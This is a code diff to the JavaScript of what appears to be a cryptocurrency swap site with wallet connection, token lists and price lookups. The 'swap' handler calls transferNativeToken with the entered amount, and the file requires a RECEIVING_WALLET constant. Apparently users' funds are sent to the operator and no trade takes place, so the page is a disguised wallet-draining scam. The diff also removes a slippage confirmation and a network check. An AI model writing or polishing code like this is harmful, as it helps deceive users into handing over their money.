@@ -7,9 +7,11 @@ if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET n
 
 // Constants
 const COINGECKO_API = "https://api.coingecko.com/api/v3";
-const GAS_PRICE_API = "https://api.etherscan.io/api?module=gastracker&action=gasoracle";
-const MAX_SLIPPAGE = 50; // 50% maximum slippage
-const MIN_SLIPPAGE = 0.1; // 0.1% minimum slippage
+const DEFAULT_PAIRS = {
+  ethereum: { from: "ETH", to: "USDT" },
+  bsc: { from: "BNB", to: "USDT" },
+  polygon: { from: "MATIC", to: "USDT" }
+};
 
 // App state
 let provider, signer, userAddress;
@@ -17,169 +19,44 @@ let currentNetwork = "ethereum";
 let currentFromToken = null;
 let currentToToken = null;
 let currentSlippage = 0.5; // 0.5% default slippage
-let transactionDeadline = 20; // 20 minutes default
-let expertMode = false;
-let tokenFavorites = JSON.parse(localStorage.getItem('tokenFavorites')) || {};
-let recentTokens = JSON.parse(localStorage.getItem('recentTokens')) || {};
 
 // Initialize on load
 window.addEventListener('load', async () => {
   try {
     // Setup event listeners
-    setupEventListeners();
+    document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
+    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
+    document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
+    document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
+    document.getElementById("swapBtn").addEventListener("click", handleSwap);
+    document.getElementById("settingsBtn").addEventListener("click", showSettings);
+    document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
+    document.getElementById("closeSettings").addEventListener("click", hideSettings);
+    document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
+    document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
+    document.getElementById("fromAmount").addEventListener("input", updateToAmount);
     
-    // Set default tokens (ETH and USDT)
-    const defaultFromToken = TOKENS.ethereum.find(t => t.symbol === "ETH");
-    const defaultToToken = TOKENS.ethereum.find(t => t.symbol === "USDT");
+    // Mobile-specific listeners
+    if (isMobile()) {
+      document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
+    }
+    
+    // Set default tokens based on network
+    const defaultFromToken = TOKENS[currentNetwork].find(t => t.symbol === DEFAULT_PAIRS[currentNetwork].from);
+    const defaultToToken = TOKENS[currentNetwork].find(t => t.symbol === DEFAULT_PAIRS[currentNetwork].to);
     
     if (defaultFromToken && defaultToToken) {
       currentFromToken = defaultFromToken;
       currentToToken = defaultToToken;
       updateTokenSelectors();
-      addToRecentTokens(defaultFromToken);
-      addToRecentTokens(defaultToToken);
     }
     
-    // Load saved settings
-    loadSavedSettings();
-    
-    // Check wallet environment
     await checkWalletEnvironment();
-    
-    // Initialize price updates
-    initializePriceUpdates();
   } catch (err) {
     console.error("Initialization error:", err);
     updateStatus("Initialization failed: " + err.message, "error");
   }
 });
-
-function setupEventListeners() {
-  document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
-  document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
-  document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
-  document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
-  document.getElementById("swapBtn").addEventListener("click", handleSwap);
-  document.getElementById("settingsBtn").addEventListener("click", showSettings);
-  document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
-  document.getElementById("closeSettings").addEventListener("click", hideSettings);
-  document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
-  document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
-  document.getElementById("fromAmount").addEventListener("input", debounce(updateToAmount, 500));
-  
-  // Settings event listeners
-  document.querySelectorAll(".dex-slippage-option").forEach(btn => {
-    btn.addEventListener("click", () => {
-      currentSlippage = parseFloat(btn.dataset.value);
-      updateSlippageUI();
-      saveSettings();
-      updateToAmount();
-    });
-  });
-  
-  document.getElementById("slippageTolerance").addEventListener("input", (e) => {
-    let value = parseFloat(e.target.value);
-    if (isNaN(value)) return;
-    
-    value = Math.max(MIN_SLIPPAGE, Math.min(value, MAX_SLIPPAGE));
-    currentSlippage = value;
-    updateSlippageUI();
-    saveSettings();
-    updateToAmount();
-  });
-  
-  document.getElementById("transactionDeadline").addEventListener("input", (e) => {
-    transactionDeadline = parseInt(e.target.value) || 20;
-    saveSettings();
-  });
-  
-  document.getElementById("expertMode").addEventListener("change", (e) => {
-    expertMode = e.target.checked;
-    saveSettings();
-  });
-  
-  // Mobile-specific listeners
-  if (isMobile()) {
-    document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
-  }
-}
-
-function loadSavedSettings() {
-  const savedSettings = JSON.parse(localStorage.getItem('swapSettings'));
-  if (savedSettings) {
-    currentSlippage = savedSettings.slippage || 0.5;
-    transactionDeadline = savedSettings.deadline || 20;
-    expertMode = savedSettings.expertMode || false;
-    
-    document.getElementById("slippageTolerance").value = currentSlippage;
-    document.getElementById("transactionDeadline").value = transactionDeadline;
-    document.getElementById("expertMode").checked = expertMode;
-    
-    updateSlippageUI();
-  }
-}
-
-function saveSettings() {
-  const settings = {
-    slippage: currentSlippage,
-    deadline: transactionDeadline,
-    expertMode: expertMode
-  };
-  localStorage.setItem('swapSettings', JSON.stringify(settings));
-}
-
-function updateSlippageUI() {
-  document.querySelectorAll(".dex-slippage-option").forEach(btn => {
-    btn.classList.toggle("active", parseFloat(btn.dataset.value) === currentSlippage);
-  });
-  document.getElementById("slippageTolerance").value = currentSlippage;
-}
-
-function addToRecentTokens(token) {
-  if (!token || !token.symbol) return;
-  
-  const network = token.originNetwork || currentNetwork;
-  if (!recentTokens[network]) recentTokens[network] = [];
-  
-  // Remove if already exists
-  recentTokens[network] = recentTokens[network].filter(t => 
-    t.address !== token.address && t.symbol !== token.symbol
-  );
-  
-  // Add to beginning
-  recentTokens[network].unshift({
-    symbol: token.symbol,
-    address: token.address,
-    name: token.name,
-    isNative: token.isNative
-  });
-  
-  // Keep only last 5
-  if (recentTokens[network].length > 5) {
-    recentTokens[network] = recentTokens[network].slice(0, 5);
-  }
-  
-  localStorage.setItem('recentTokens', JSON.stringify(recentTokens));
-}
-
-function toggleTokenFavorite(token) {
-  if (!token || !token.symbol) return;
-  
-  const key = `${token.originNetwork || currentNetwork}_${token.address}`;
-  tokenFavorites[key] = !tokenFavorites[key];
-  localStorage.setItem('tokenFavorites', JSON.stringify(tokenFavorites));
-  
-  return tokenFavorites[key];
-}
-
-function initializePriceUpdates() {
-  // Update prices every 30 seconds
-  setInterval(async () => {
-    if (currentFromToken || currentToToken) {
-      await updateToAmount();
-    }
-  }, 30000);
-}
 
 // =====================
 // UTILITY FUNCTIONS
@@ -187,14 +64,6 @@ function initializePriceUpdates() {
 
 function isMobile() {
   return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-}
-
-function debounce(func, timeout = 300) {
-  let timer;
-  return (...args) => {
-    clearTimeout(timer);
-    timer = setTimeout(() => { func.apply(this, args); }, timeout);
-  };
 }
 
 function updateNetworkLogo(network) {
@@ -207,7 +76,35 @@ function updateNetworkLogo(network) {
   const logoElement = document.querySelector(".dex-nav-logo img");
   if (logoMap[network]) {
     logoElement.src = logoMap[network];
+    logoElement.alt = NETWORK_CONFIGS[network].chainName;
   }
+}
+
+function getTokenLogoUrl(token) {
+  // For native tokens
+  if (token.isNative) {
+    return `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
+  }
+  
+  // For known contract tokens
+  const knownTokens = {
+    // Ethereum
+    "0xdAC17F958D2ee523a2206206994597C13D831ec7": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT
+    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC
+    "0x6B175474E89094C44Da98b954EedeAC495271d0F": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png", // DAI
+    
+    // BSC
+    "0x55d398326f99059fF775485246999027B3197955": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT-BSC
+    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC-BSC
+    "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png", // DAI-BSC
+    
+    // Polygon
+    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT-MATIC
+    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC-MATIC
+    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png" // DAI-MATIC
+  };
+  
+  return knownTokens[token.address] || "https://cryptologos.cc/logos/ethereum-eth-logo.png";
 }
 
 // =====================
@@ -250,35 +147,13 @@ async function initializeWallet() {
     localStorage.setItem('walletConnected', 'metamask');
     updateWalletButton(true);
     
-    // Update token balances
-    updateTokenBalances();
+    // Fetch initial balances
+    await updateTokenBalances();
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
     updateStatus("Connection error. Please try again.", "error");
     return false;
-  }
-}
-
-async function updateTokenBalances() {
-  if (!userAddress || !currentFromToken) return;
-  
-  try {
-    let balance;
-    if (currentFromToken.isNative) {
-      balance = await provider.getBalance(userAddress);
-    } else {
-      const contract = new ethers.Contract(currentFromToken.address, ERC20_ABI, provider);
-      balance = await contract.balanceOf(userAddress);
-    }
-    
-    const decimals = currentFromToken.decimals || 18;
-    const formattedBalance = ethers.utils.formatUnits(balance, decimals);
-    document.getElementById("fromTokenBalance").textContent = 
-      `Balance: ${parseFloat(formattedBalance).toFixed(6)}`;
-  } catch (err) {
-    console.error("Error fetching balance:", err);
-    document.getElementById("fromTokenBalance").textContent = "Balance: -";
   }
 }
 
@@ -292,6 +167,7 @@ async function handleWalletConnection() {
     updateWalletButton(false);
     updateSwapButton();
     updateStatus("Wallet disconnected", "success");
+    document.getElementById("fromTokenBalance").textContent = "Balance: 0";
     return;
   }
 
@@ -331,7 +207,6 @@ async function connectAndProcess() {
     
     await initializeWallet();
     updateSwapButton();
-    updateTokenBalances();
   } catch (err) {
     console.error("Connection error:", err);
     updateStatus("Error: " + err.message, "error");
@@ -361,19 +236,48 @@ function openInTrustWallet() {
 // =====================
 
 async function handleNetworkChange(network) {
-  currentNetwork = network;
-  document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-  updateNetworkLogo(network);
-  
-  // Reset tokens when network changes
-  currentFromToken = null;
-  currentToToken = null;
-  updateTokenSelectors();
-  
-  if (userAddress) {
-    await checkNetwork();
-    updateTokenBalances();
+  try {
+    showLoader();
+    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
+    
+    currentNetwork = network;
+    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+    updateNetworkLogo(network);
+    
+    // Set default tokens for the new network
+    const defaultFromToken = TOKENS[network].find(t => t.symbol === DEFAULT_PAIRS[network].from);
+    const defaultToToken = TOKENS[network].find(t => t.symbol === DEFAULT_PAIRS[network].to);
+    
+    if (defaultFromToken && defaultToToken) {
+      currentFromToken = defaultFromToken;
+      currentToToken = defaultToToken;
+      updateTokenSelectors();
+      
+      // Update balances if wallet is connected
+      if (userAddress) {
+        await updateTokenBalances();
+      }
+    }
+    
+    // If wallet is connected, check if we need to switch networks
+    if (userAddress) {
+      await checkNetwork();
+    }
+    
+    updateStatus(`Switched to ${NETWORK_CONFIGS[network].chainName}`, "success");
+  } catch (err) {
+    console.error("Network change error:", err);
+    updateStatus("Failed to switch network: " + err.message, "error");
+  } finally {
+    hideLoader();
   }
+}
+
+function showNetworkOptions() {
+  const networks = Object.keys(NETWORK_CONFIGS);
+  const currentIndex = networks.indexOf(currentNetwork);
+  const nextNetwork = networks[(currentIndex + 1) % networks.length];
+  handleNetworkChange(nextNetwork);
 }
 
 async function checkNetwork() {
@@ -411,6 +315,35 @@ async function checkNetwork() {
 // =====================
 // TOKEN FUNCTIONS
 // =====================
+
+async function updateTokenBalances() {
+  if (!userAddress || !provider) return;
+  
+  try {
+    const balanceElement = document.getElementById("fromTokenBalance");
+    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
+    
+    // Update native token balance
+    const nativeBalance = await provider.getBalance(userAddress);
+    const nativeSymbol = NETWORK_CONFIGS[currentNetwork].nativeCurrency.symbol;
+    const nativeDecimals = NETWORK_CONFIGS[currentNetwork].nativeCurrency.decimals;
+    
+    let balanceText = `Balance: ${ethers.utils.formatUnits(nativeBalance, nativeDecimals)} ${nativeSymbol}`;
+    
+    // Update current from token balance if it's not native
+    if (currentFromToken && !currentFromToken.isNative) {
+      const contract = new ethers.Contract(currentFromToken.address, ERC20_ABI, provider);
+      const balance = await contract.balanceOf(userAddress);
+      balanceText = `Balance: ${ethers.utils.formatUnits(balance, currentFromToken.decimals)} ${currentFromToken.symbol}`;
+    }
+    
+    balanceElement.textContent = balanceText;
+  } catch (err) {
+    console.error("Error fetching balances:", err);
+    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
+    updateStatus("Error fetching token balances", "error");
+  }
+}
 
 function showTokenList(type) {
   const modal = document.getElementById("tokenListModal");
@@ -467,116 +400,53 @@ function showTokenList(type) {
     noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
   };
   
-  // Add section for favorites if any exist
-  const favoriteTokens = networkTokens.filter(token => {
-    const key = `${token.originNetwork || currentNetwork}_${token.address}`;
-    return tokenFavorites[key];
-  });
-  
-  if (favoriteTokens.length > 0) {
-    const favoritesHeader = document.createElement('div');
-    favoritesHeader.className = 'dex-token-section-header';
-    favoritesHeader.textContent = 'Favorites';
-    tokenItems.appendChild(favoritesHeader);
-    
-    favoriteTokens.forEach(token => {
-      addTokenToModal(token, type, tokenItems, true);
-    });
-  }
-  
-  // Add section for recent tokens if any exist
-  const recentNetworkTokens = recentTokens[currentNetwork] || [];
-  if (recentNetworkTokens.length > 0) {
-    const recentHeader = document.createElement('div');
-    recentHeader.className = 'dex-token-section-header';
-    recentHeader.textContent = 'Recently Used';
-    tokenItems.appendChild(recentHeader);
-    
-    recentNetworkTokens.forEach(recentToken => {
-      const fullToken = networkTokens.find(t => 
-        t.symbol === recentToken.symbol && 
-        t.address === recentToken.address
-      );
-      if (fullToken) {
-        addTokenToModal(fullToken, type, tokenItems);
-      }
-    });
-  }
-  
-  // Add all tokens section
-  const allHeader = document.createElement('div');
-  allHeader.className = 'dex-token-section-header';
-  allHeader.textContent = 'All Tokens';
-  tokenItems.appendChild(allHeader);
-  
   // Add tokens to list
   if (networkTokens.length === 0) {
     noTokensFound.style.display = 'block';
   } else {
     networkTokens.forEach(token => {
-      // Skip if already added as favorite or recent
-      const key = `${token.originNetwork || currentNetwork}_${token.address}`;
-      if (tokenFavorites[key] || 
-          recentNetworkTokens.some(t => t.symbol === token.symbol && t.address === token.address)) {
-        return;
-      }
-      addTokenToModal(token, type, tokenItems);
+      const tokenItem = document.createElement('div');
+      tokenItem.className = 'dex-token-item';
+      tokenItem.dataset.name = token.name.toLowerCase();
+      tokenItem.dataset.symbol = token.symbol.toLowerCase();
+      tokenItem.dataset.address = token.address.toLowerCase();
+      tokenItem.innerHTML = `
+        <img src="${getTokenLogoUrl(token)}" 
+             onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
+             alt="${token.symbol}">
+        <div>
+          <div class="dex-token-name">${token.name} 
+            ${token.originNetwork !== currentNetwork ? 
+              `<span class="token-network-badge">${token.originNetwork}</span>` : ''}
+          </div>
+          <div class="dex-token-symbol">${token.symbol}</div>
+          ${token.address ? `<div class="dex-token-address">${token.address.slice(0, 6)}...${token.address.slice(-4)}</div>` : ''}
+        </div>
+      `;
+      
+      tokenItem.addEventListener('click', () => {
+        if (type === 'from') {
+          currentFromToken = token;
+        } else {
+          currentToToken = token;
+        }
+        updateTokenSelectors();
+        hideTokenList();
+        updateToAmount();
+        
+        // Update balance if wallet is connected and from token changed
+        if (type === 'from' && userAddress) {
+          updateTokenBalances();
+        }
+      });
+      
+      tokenItems.appendChild(tokenItem);
     });
   }
   
   modal.style.display = 'flex';
   searchInput.value = '';
   searchInput.focus();
-}
-
-function addTokenToModal(token, type, container, isFavorite = false) {
-  const tokenItem = document.createElement('div');
-  tokenItem.className = 'dex-token-item';
-  tokenItem.dataset.name = token.name.toLowerCase();
-  tokenItem.dataset.symbol = token.symbol.toLowerCase();
-  tokenItem.dataset.address = token.address.toLowerCase();
-  
-  const key = `${token.originNetwork || currentNetwork}_${token.address}`;
-  const isFav = isFavorite || tokenFavorites[key];
-  
-  tokenItem.innerHTML = `
-    <img src="https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png" 
-         onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
-         alt="${token.symbol}">
-    <div class="dex-token-info">
-      <div class="dex-token-name">${token.name} 
-        ${token.originNetwork !== currentNetwork ? 
-          `<span class="token-network-badge">${token.originNetwork}</span>` : ''}
-      </div>
-      <div class="dex-token-symbol">${token.symbol}</div>
-    </div>
-    <button class="dex-token-favorite ${isFav ? 'active' : ''}">
-      <i class="fas fa-star"></i>
-    </button>
-  `;
-  
-  tokenItem.addEventListener('click', () => {
-    if (type === 'from') {
-      currentFromToken = token;
-      addToRecentTokens(token);
-      updateTokenBalances();
-    } else {
-      currentToToken = token;
-      addToRecentTokens(token);
-    }
-    updateTokenSelectors();
-    hideTokenList();
-    updateToAmount();
-  });
-  
-  const favoriteBtn = tokenItem.querySelector('.dex-token-favorite');
-  favoriteBtn.addEventListener('click', (e) => {
-    e.stopPropagation();
-    const isNowFavorite = toggleTokenFavorite(token);
-    favoriteBtn.classList.toggle('active', isNowFavorite);
-  });
-  
-  container.appendChild(tokenItem);
 }
 
 function hideTokenList() {
@@ -589,9 +459,10 @@ function updateTokenSelectors() {
   
   if (currentFromToken) {
     fromTokenBtn.innerHTML = `
-      <img src="https://cryptologos.cc/logos/${currentFromToken.symbol.toLowerCase()}-${currentFromToken.symbol.toLowerCase()}-logo.png" 
+      <img src="${getTokenLogoUrl(currentFromToken)}" 
            onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
-           width="24" height="24">
+           width="24" height="24"
+           alt="${currentFromToken.symbol}">
       <span>${currentFromToken.symbol}</span>
       <i class="fas fa-chevron-down"></i>
     `;
@@ -604,9 +475,10 @@ function updateTokenSelectors() {
   
   if (currentToToken) {
     toTokenBtn.innerHTML = `
-      <img src="https://cryptologos.cc/logos/${currentToToken.symbol.toLowerCase()}-${currentToToken.symbol.toLowerCase()}-logo.png" 
+      <img src="${getTokenLogoUrl(currentToToken)}" 
            onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
-           width="24" height="24">
+           width="24" height="24"
+           alt="${currentToToken.symbol}">
       <span>${currentToToken.symbol}</span>
       <i class="fas fa-chevron-down"></i>
     `;
@@ -624,17 +496,12 @@ async function updateToAmount() {
   const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
   
   if (currentFromToken && currentToToken && fromAmount > 0) {
-    // Show loading state
     document.getElementById("exchangeRate").textContent = "Loading...";
     document.getElementById("minReceived").textContent = "Loading...";
     document.getElementById("priceImpact").textContent = "Loading...";
     
     try {
-      const [rate, gasPrice] = await Promise.all([
-        getConversionRate(currentFromToken, currentToToken),
-        getGasPriceEstimate()
-      ]);
-      
+      const rate = await getConversionRate(currentFromToken, currentToToken);
       const toAmount = fromAmount * rate;
       const priceImpact = calculatePriceImpact(fromAmount, toAmount);
       
@@ -652,22 +519,6 @@ async function updateToAmount() {
         (priceImpact > 3 ? " high" : "") + 
         (priceImpact > 5 ? " very-high" : "");
       
-      // Show token prices if available
-      const fromPrice = await getTokenPrice(currentFromToken);
-      if (fromPrice) {
-        document.getElementById("fromTokenPrice").textContent = 
-          `$${(fromAmount * fromPrice).toLocaleString('en-US', { 
-            minimumFractionDigits: 2, 
-            maximumFractionDigits: 2 
-          })}`;
-      }
-      
-      // Show gas estimate
-      if (gasPrice) {
-        document.getElementById("gasEstimate").textContent = 
-          `${gasPrice} ${currentNetwork === 'ethereum' ? 'Gwei' : 'Gwei'}`;
-      }
-      
     } catch (err) {
       console.error("Error updating amounts:", err);
       updateStatus("Error fetching price data", "error");
@@ -676,8 +527,8 @@ async function updateToAmount() {
     document.getElementById("toAmount").value = '';
     document.getElementById("exchangeRate").textContent = '-';
     document.getElementById("minReceived").textContent = '-';
-    document.getElementById("priceImpact").textContent = '-';
-    document.getElementById("fromTokenPrice").textContent = '';
+    document.getElementById("priceImpact").textContent = '<0.01%';
+    document.getElementById("priceImpact").className = "dex-price-impact";
   }
   
   updateSwapButton();
@@ -691,26 +542,11 @@ function calculatePriceImpact(fromAmount, toAmount) {
   return (baseRate + amountImpact) * 100; // Convert to percentage
 }
 
-async function getGasPriceEstimate() {
-  try {
-    if (currentNetwork !== 'ethereum') return null;
-    
-    const response = await fetch(GAS_PRICE_API);
-    const data = await response.json();
-    return data.result?.ProposeGasPrice || null;
-  } catch (err) {
-    console.error("Error fetching gas price:", err);
-    return null;
-  }
-}
-
 async function getConversionRate(fromToken, toToken) {
   try {
     // Get prices from CoinGecko
-    const [fromPrice, toPrice] = await Promise.all([
-      getTokenPrice(fromToken),
-      getTokenPrice(toToken)
-    ]);
+    const fromPrice = await getTokenPrice(fromToken);
+    const toPrice = await getTokenPrice(toToken);
     
     if (fromPrice && toPrice) {
       return fromPrice / toPrice;
@@ -730,7 +566,7 @@ async function getConversionRate(fromToken, toToken) {
     'BNB-USDT': 300,
     'USDT-BNB': 0.0033,
     'MATIC-USDT': 0.7,
-    'USDT-MATIC': 1.42
+    'USDT-MATIC': 1.428
   };
   
   const pair = `${fromToken.symbol}-${toToken.symbol}`;
@@ -746,9 +582,14 @@ async function getTokenPrice(token) {
       polygon: 'matic-network'
     };
     
-    const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
-    const data = await response.json();
-    return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
+    try {
+      const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
+      const data = await response.json();
+      return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
+    } catch (err) {
+      console.error("Error fetching native token price:", err);
+      return null;
+    }
   } else {
     // Handle contract tokens
     const chainMap = {
@@ -778,18 +619,9 @@ async function handleSwap() {
   const fromAmount = parseFloat(document.getElementById("fromAmount").value);
   if (!fromAmount || fromAmount <= 0) return;
   
-  // Show confirmation modal if not in expert mode and slippage is high
-  if (!expertMode && currentSlippage > 3) {
-    const confirmed = confirm(`You have set a high slippage tolerance (${currentSlippage}%). Continue anyway?`);
-    if (!confirmed) return;
-  }
-  
   try {
     showLoader();
     updateStatus("Processing swap...", "success");
-    
-    // First check if we need to switch networks
-    await checkNetwork();
     
     if (currentFromToken.isNative) {
       await transferNativeToken(fromAmount);
@@ -801,8 +633,8 @@ async function handleSwap() {
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     
-    // Update balances after swap
-    updateTokenBalances();
+    // Update balance after swap
+    await updateTokenBalances();
   } catch (err) {
     console.error("Swap error:", err);
     updateStatus("Swap failed: " + err.message, "error");
@@ -900,12 +732,6 @@ function updateSwapButton() {
   btnText.textContent = "Swap";
 }
 
-function showNetworkOptions() {
-  const newNetwork = currentNetwork === "ethereum" ? "bsc" : 
-                    currentNetwork === "bsc" ? "polygon" : "ethereum";
-  handleNetworkChange(newNetwork);
-}
-
 function showSettings() {
   document.getElementById("settingsModal").style.display = 'flex';
 }
@@ -920,4 +746,29 @@ function showWalletConnect() {
 
 function hideWalletConnect() {
   document.getElementById("walletConnectModal").style.display = 'none';
+}
+
+// Listen for account changes
+if (window.ethereum) {
+  window.ethereum.on('accountsChanged', (accounts) => {
+    if (accounts.length === 0) {
+      // Wallet disconnected
+      userAddress = null;
+      provider = null;
+      signer = null;
+      localStorage.removeItem('walletConnected');
+      updateWalletButton(false);
+      document.getElementById("fromTokenBalance").textContent = "Balance: 0";
+    } else {
+      // Account changed
+      userAddress = accounts[0];
+      updateWalletButton(true);
+      updateTokenBalances();
+    }
+  });
+
+  // Listen for chain changes
+  window.ethereum.on('chainChanged', (chainId) => {
+    window.location.reload();
+  });
 }
